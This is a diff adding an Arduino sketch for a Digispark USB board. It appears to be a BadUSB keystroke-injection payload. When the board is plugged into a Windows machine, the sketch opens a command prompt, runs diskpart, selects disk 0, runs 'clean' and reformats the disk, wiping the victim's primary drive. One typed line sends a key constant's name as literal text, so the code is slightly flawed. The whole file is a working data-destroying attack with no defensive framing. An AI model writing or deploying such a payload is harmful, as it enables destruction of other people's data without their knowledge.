@@ -1,0 +1,47 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+
+}
+void loop() {
+
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("diskpart");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("KEY_LEFT 0xD8");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("select disk 0");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("clean");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("create partition primary");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("format fs=ntfs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+
+
+
+  for(;;) {  
+
+
+  }
+}
